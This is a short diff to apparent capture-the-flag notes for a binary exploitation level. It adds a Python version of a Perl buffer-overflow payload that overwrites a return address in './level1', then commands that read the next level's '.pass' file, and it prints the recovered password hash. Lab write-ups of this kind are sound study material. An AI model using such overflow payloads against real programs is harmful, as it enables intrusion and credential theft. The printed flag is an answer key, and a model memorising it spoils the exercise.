@@ -27,3 +27,10 @@ eip => 0x8048495
 
 
 (perl -e 'print "A"x76 . "\x44\x84\x04\x08"' ; cat) | ./level1
+(python -c "print 'B' * 76 + '\x44\x84\x04\x08'" ; cat) | ./level1
+
+
+cd /home/user/level2
+ls -la
+cat .pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
